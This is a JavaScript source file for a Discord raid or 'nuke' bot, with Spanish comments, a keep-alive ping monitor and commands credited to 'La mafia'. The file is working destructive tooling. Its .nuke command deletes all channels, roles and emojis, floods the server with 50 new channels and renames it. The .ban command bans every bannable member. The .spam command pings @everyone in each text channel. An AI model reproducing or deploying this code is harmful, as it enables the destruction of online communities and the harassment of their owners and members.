// servidor

const keepAlive = require('./server');
const Monitor = require('ping-monitor');
 
keepAlive();
const monitor = new Monitor({
    website: 'https://servraider.luisgames.repl.run',
    title: 'dos',
    interval: 15 // minutes
});
 
monitor.on('up', (res) => console.log(`${res.website} está encedido.`));
monitor.on('down', (res) => console.log(`${res.website} se ha caído - ${res.statusMessage}`));
monitor.on('stop', (website) => console.log(`${website} se ha parado.`) );
monitor.on('error', (error) => console.log(error));

// bot

const Discord = require('discord.js');
const client = new Discord.Client();

require("dotenv").config()

const config = {
"prefix" : ".",
"dmMessage" : "**La mafia attack**",
"serverName" : "Luis [ATTACK]",
"iconURL" : "https://pbs.twimg.com/profile_images/1301622573965467648/_Nz9QsS1_400x400.jpg",
"banReason" : "La mafia attack",

}
 
client.on("ready", async () => {
console.log(`${client.user.username} is ready to nuke ;)\n Make sure you have written the config variable !!`)     
});



client.on("message", async(message)=>{
  if (!message.guild) return;
    if (message.content.startsWith(`${config.prefix}nuke`)) {      

      let i=0
              for(i=0;i<50;i++) {message.guild.channels.create("Raid By luis")}
              message.guild.channels.cache.array().forEach(channel => {channel.delete().then((c) => {console.log(`DELETED CHANNEL: ${c.name}`)})
  })
    message.guild.roles.cache.filter(r => !r.managed && r.position < message.guild.me.roles.highest.position && r.id !== message.guild.id).forEach((role)=>{
      role.delete().then((e)=> {console.log(`DELETED ROLE: ${e.name}`)})
    })
   message.guild.emojis.cache.array().forEach(emoji => {emoji.delete().then((e)=> {console.log(`DELETED EMOJI: ${e.name}`)})
  })
   message.guild.setName(config.serverName)
   message.guild.setIcon(config.iconURL)
}

if (message.content.startsWith(`${config.prefix}ban`)) {      
  message.guild.members.cache.array().filter(member => message.guild.member(member).bannable && member.id !== message.author.id).forEach(member => {
    message.guild.members.ban(member, {reason: config.banReason}).then((m)=> {console.log(`BANNED USER: ${m.name}`)})
                                                                                        
   })  
  }

  if(message.content.startsWith(`${config.prefix}ping`)){
    		         message.channel.send('Ping?').then(m => m.edit(`${m.createdTimestamp - message.createdTimestamp}ms`))

  }

  if(message.content.startsWith(`${config.prefix}LMhelp`)){
    		         const {MessageEmbed} = require("discord.js");
                 let embed = new MessageEmbed()
                 .setTitle("La mafia, Raider Help")
                 .setDescription('**.nuke**\n`Elimina todos los canales, roles y emojis, por otro lado hace 50 canales con el nombre "raid by la mafia". Tambien cambia el nombre del servidor a "La mafia [ATTACK]" y cambia la foto del server por la de la mafia`\n\n**.ban**\n`Banea a todos los usuarios que el bot pueda mientras los miembros sean un rol por debajo que el rol del bot`\n\n**.spam**\n`Hace ping en todos los canales actuales, usar este comando despues de que se hayan creado todos los canales de nombre "raid by la mafia"`')
                 .setColor("RANDOM");

                 message.author.send(embed);
  }

if(message.content.startsWith(`${config.prefix}spam`)){
   const channels = message.guild.channels.cache.filter(ch => ch.type == "text");

      channels.forEach(channel => {
               let i=0
               for(i=0;i<1;i++) {channel.send("@everyone Luis **ATTACK**")}

               
             });

}

   
});

client.login(process.env.token);